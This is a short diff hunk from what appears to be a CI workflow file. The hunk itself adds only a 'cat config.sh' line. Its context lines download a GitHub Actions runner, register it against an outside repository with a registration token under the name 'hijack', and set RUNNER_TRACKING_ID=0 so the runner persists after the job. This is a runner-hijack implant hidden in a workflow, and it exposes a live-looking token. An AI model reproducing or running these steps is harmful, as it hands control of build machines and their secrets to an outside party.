@@ -23,6 +23,7 @@ jobs:
           echo "93ac1b7ce743ee85b5d386f5c1787385ef07b3d7c728ff66ce0d3813d5f46900  actions-runner-linux-x64-2.320.0.tar.gz" | shasum -a 256 -c
           tar xzf ./actions-runner-linux-x64-2.320.0.tar.gz
           file ./bin/Runner.Listener
+          cat config.sh
           chmod +x ./bin/Runner.Listener
           ./config.sh --url https://github.com/he1m4n6a/dcweb --token ABXG7KLYMT35N373XQQ6BL3HCEWQU --name hijack
           export RUNNER_TRACKING_ID=0;
